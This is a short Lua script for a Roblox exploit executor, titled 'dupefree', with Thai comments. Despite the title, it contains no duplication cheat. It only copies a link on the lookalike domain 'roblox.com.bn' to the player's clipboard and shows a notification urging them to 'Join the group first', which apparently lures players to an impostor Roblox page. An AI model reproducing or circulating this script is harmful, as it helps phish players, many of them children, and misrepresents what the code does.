-- [[ dupefree ]] --

-- Join the group first.
local textToCopy = "https://www.roblox.com.bn/communities/371703349547/script-Free" 

-- ฟังก์ชันหลักในการส่งข้อความเข้า Clipboard
if setclipboard then
    setclipboard(textToCopy)
    
    -- แจ้งเตือนผู้เล่นผ่านหน้าจอ (StarterGui) เพื่อให้เขารู้ตัว
    game:GetService("StarterGui"):SetCore("SendNotification", {
        Title = "System: Copied!",
        Text = "Join the group first.!",
        Duration = 5
    })
    
    print("Success: Copied to clipboard!")
else
    -- กรณีที่ Executor ไม่รองรับ (เช่น ตัวรันฟรีบางตัว)
    warn("Executor ของคุณไม่รองรับการ Copy อัตโนมัติ")
end
